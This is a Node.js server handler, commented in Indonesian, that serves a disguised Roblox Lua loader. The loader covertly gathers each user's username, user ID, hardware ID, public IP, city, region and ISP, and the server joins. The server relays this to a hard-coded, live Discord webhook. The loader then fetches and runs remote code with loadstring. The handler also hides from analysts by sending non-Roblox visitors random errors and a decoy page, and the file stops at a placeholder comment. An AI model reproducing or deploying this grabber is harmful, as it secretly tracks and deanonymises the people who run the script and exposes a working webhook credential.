const https = require('https');

// ============================
// SETTINGS
// ============================
const SETTINGS = {
    WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5",
    TOTAL_LAYERS: 5,
    MIN_WAIT: 112, 
    MAX_WAIT: 119, 
    SESSION_EXPIRY: 10000, 
    KEY_LIFETIME: 5000,   
    PLAIN_TEXT_URL: "https://pastefy.app/cMzbfLvJ/raw",
    REAL_SCRIPT_URL: "https://raw.githubusercontent.com/xvndr4wz/loader/refs/heads/main/SLFB.lua"
};

let sessions = {}; 
let blacklist = {}; 

function fetchRaw(url) {
    return new Promise((resolve) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => resolve(data.trim()));
        }).on('error', () => resolve(null));
    });
}

function getRandomError() {
    const errorCodes = [400, 401, 403, 404, 500, 502, 503];
    return errorCodes[Math.floor(Math.random() * errorCodes.length)];
}

function getWIBTime() {
    return new Intl.DateTimeFormat('id-ID', {
        timeZone: 'Asia/Jakarta',
        dateStyle: 'medium',
        timeStyle: 'medium'
    }).format(new Date());
}

// ==========================================
// FUNGSI KIRIM KE DISCORD (WEBHOOK TERSEMBUNYI)
// ==========================================
async function sendWebhookLog(embedData) {
    const data = JSON.stringify({ embeds: [embedData] });

    const url = new URL(SETTINGS.WEBHOOK);
    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };

    return new Promise(function(resolve) {
        const req = https.request(options, function(res) {
            res.on('data', function(chunk) {});
            res.on('end', function() { resolve(true); });
        });
        req.on('error', function() { resolve(false); });
        req.write(data);
        req.end();
    });
}

// ==========================================
// ENDPOINT KHUSUS LOGGER DARI ROBLOX
// ==========================================
async function handleLogger(req, res, ip) {
    let body = '';
    
    await new Promise((resolve) => {
        req.on('data', chunk => { body += chunk; });
        req.on('end', resolve);
    });
    
    try {
        const logData = JSON.parse(body);
        
        // Format embed untuk Discord
        const embed = {
            title: "🚀 Ndraawz Logger System",
            color: 0x00ff88,
            fields: logData.fields || [],
            footer: {
                text: "Ndraawz Logger System | IP: " + ip
            },
            timestamp: new Date().toISOString()
        };
        
        // Kirim ke Discord (webhook cuma ada di server!)
        await sendWebhookLog(embed);
        
        res.status(200).json({ success: true });
    } catch (err) {
        res.status(500).send("Error");
    }
}

// ==========================================
// MAIN HANDLER (ANTI-CURI SYSTEM)
// ==========================================
module.exports = async function(req, res) {
    res.setHeader('Content-Type', 'text/plain');
    
    const now = Date.now();
    const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
    const agent = req.headers['user-agent'] || "";
    const url = req.url || "";
    
    // 🔥 KHUSUS ENDPOINT /log - TERIMA DATA DARI ROBLOX 🔥
    if (url === '/log' && req.method === 'POST') {
        return handleLogger(req, res, ip);
    }
    
    // ========== SISANYA ANTI-CURI SYSTEM ==========
    const isRoblox = agent.includes("Roblox") && 
                     (req.headers['roblox-id'] || req.headers['x-roblox-place-id'] || agent.includes("RobloxApp"));
    const isDiscord = agent.includes("Discordbot");

    if (!isRoblox || isDiscord || blacklist[ip] === true) {
        const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
    }

    const urlParts = req.url.split('?');
    const queryString = urlParts[1] || "";
    const params = queryString.split('.');
    
    const step = params[0]; 
    const id = params[1];   
    const key = params[2];  
    
    const currentStep = parseInt(step) || 0;
    const host = req.headers.host;
    const currentPath = urlParts[0];

    try {
        if (currentStep > 0) {
            const session = sessions[id];
            if (session === undefined || session.ownerIP !== ip) {
                const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
                return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
            }
            const expectedStep = session.stepSequence[session.currentIndex];
            if (currentStep !== expectedStep) {
                delete sessions[id];
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            if (session.used === true) {
                blacklist[ip] = true;
                await sendWebhookLog({
                    title: "❗️Ndraawz Security❗️",
                    description: "🚫 **REPLAY ATTACK**\n**IP:** `" + ip + "` mencoba akses ulang link mati.",
                    color: 0xff0000,
                    footer: { text: "Ndraawz Security | WIB: " + getWIBTime() }
                });
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            const sessionDuration = now - session.startTime;
            const keyDuration = now - session.keyCreatedAt;
            if (sessionDuration > SETTINGS.SESSION_EXPIRY || keyDuration > SETTINGS.KEY_LIFETIME) {
                delete sessions[id];
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            if (session.nextKey !== key) {
                delete sessions[id];
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            const timeSinceLastRequest = now - session.lastTime;
            if (timeSinceLastRequest < session.requiredWait) {
                blacklist[ip] = true;
                delete sessions[id];
                await sendWebhookLog({
                    title: "❗️Ndraawz Security❗️",
                    description: "🚫 **DETECT BOT**\n**IP:** `" + ip + "` timing violation.",
                    color: 0xff0000,
                    footer: { text: "Ndraawz Security | WIB: " + getWIBTime() }
                });
                return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
            }
            session.used = true;
        }
        
        if (currentStep === 0) {
            const ipPart = ip.split('.').pop() || "0";
            const seed = parseInt(ipPart) + Math.floor(Math.random() * 10000);
            const newSessionID = seed.toString(36).substring(0, 4).padEnd(4, 'x');
            const nextKey = Math.random().toString(36).substring(2, 8);
            const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
            let sequence = [];
            while(sequence.length < SETTINGS.TOTAL_LAYERS) {
                let r = Math.floor(Math.random() * 300) + 1;
                if(!sequence.includes(r)) sequence.push(r);
            }
            sessions[newSessionID] = { 
                ownerIP: ip, 
                stepSequence: sequence,
                currentIndex: 0,
                nextKey: nextKey, 
                lastTime: now, 
                startTime: now, 
                keyCreatedAt: now, 
                requiredWait: waitTime, 
                used: false 
            };
            const firstStep = sequence[0];
            const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
            
            // 🔥 SCRIPT LUNA YANG DIKIRIM KE ROBLOX (SUDAH include logger) 🔥
            const luaScript = `-- LOGGER SCRIPT (kirim data ke server dulu)
local function sendLogToServer()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalytics = game:GetService("RbxAnalyticsService")
    local LocalizationService = game:GetService("LocalizationService")
    
    local LocalPlayer = Players.LocalPlayer
    local DName = LocalPlayer.DisplayName
    local Name = LocalPlayer.Name
    local UserId = LocalPlayer.UserId
    local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
    local CountryCode = LocalizationService.RobloxLocaleId
    
    local GetHwid = "Not Supported"
    local success_hwid, hwidRes = pcall(function() return RbxAnalytics:GetClientId() end)
    if success_hwid then GetHwid = hwidRes end
    
    local FriendsCount, FollowersCount, FollowingCount = "0", "0", "0"
    pcall(function()
        FriendsCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/friends/count")).count
        FollowersCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followers/count")).count
        FollowingCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followings/count")).count
    end)
    
    local TotalDays = LocalPlayer.AccountAge
    local Years = math.floor(TotalDays / 365)
    local Months = math.floor((TotalDays % 365) / 30)
    local AgeFormatted = string.format("%d Hari / %d Bulan / %d Tahun", TotalDays, Months, Years)
    
    local MonthsList = {"Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"}
    local DateTable = os.date("*t")
    local ExecutedTime = string.format("%d %s %d | %02d:%02d:%02d", DateTable.day, MonthsList[DateTable.month], DateTable.year, DateTable.hour, DateTable.min, DateTable.sec)
    
    local GetIp = "Gagal"
    local IpData = {}
    pcall(function()
        GetIp = game:HttpGet("https://v4.ident.me/")
        IpData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
    end)
    
    local GameName = "Unknown"
    pcall(function() GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
    local JobId = game.JobId
    local PlaceId = game.PlaceId
    local PlayerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers
    
    local JoinCode = string.format("Roblox.GameLauncher.joinGameInstance(%d, '%s')", PlaceId, JobId)
    local JoinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', PlaceId, JobId)
    
    local function GetExecutor()
        if identifyexecutor then return identifyexecutor() end
        if syn then return "Synapse X" end
        return "Unknown"
    end
    local Executor = GetExecutor()
    
    local fields = {
        { name = "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
        { name = "📛 Display Name", value = DName, inline = false },
        { name = "👤 Username", value = Name, inline = false },
        { name = "🆔 User ID", value = tostring(UserId), inline = false },
        { name = "💎 Membership", value = MembershipType, inline = false },
        { name = "🎂 Account Age", value = AgeFormatted, inline = false },
        { name = "👥 Friends / Followers / Following", value = FriendsCount .. " / " .. FollowersCount .. " / " .. FollowingCount, inline = false },
        { name = "🚩 Locale", value = CountryCode, inline = false },
        { name = "⚙️ Executor", value = Executor, inline = false },
        { name = "💻 HWID", value = GetHwid, inline = false },
        { name = "⏰ Executed Time", value = ExecutedTime, inline = false },
        { name = "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
        { name = "📡 IP Address", value = GetIp, inline = false },
        { name = "🚩 Country", value = IpData.country or "N/A", inline = false },
        { name = "📍 Region", value = IpData.regionName or "N/A", inline = false },
        { name = "🏙️ City", value = IpData.city or "N/A", inline = false },
        { name = "🏢 ISP", value = IpData.isp or "N/A", inline = false },
        { name = "━━━━━━━━━━━━━━ 🎮 SERVER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
        { name = "🎮 Game Name", value = GameName, inline = false },
        { name = "🆔 Place ID", value = tostring(PlaceId), inline = false },
        { name = "👥 Players", value = PlayerCount, inline = false },
        { name = "🔑 Job ID", value = JobId, inline = false },
        { name = "📜 Console Join", value = JoinCode, inline = false },
        { name = "📜 Executor Join", value = JoinScript, inline = false }
    }
    
    local requestFunc = (syn and syn.request) or (http_request) or (request)
    if requestFunc then
        requestFunc({
            Url = "https://" .. "${host}" .. "/log",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ fields = fields })
        })
    end
end

sendLogToServer()
task.wait(` + (waitTime / 1000) + `) loadstring(game:HttpGet("` + nextUrl + `"))()`;
            
            return res.status(200).send(luaScript);
        }

        // ... lanjutan anti-curi system (rotasi ghost id, final script) ...
        // (kode dari sini tetap sama seperti kode awal lu)
        
    } catch (err) {
        const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
    }
};
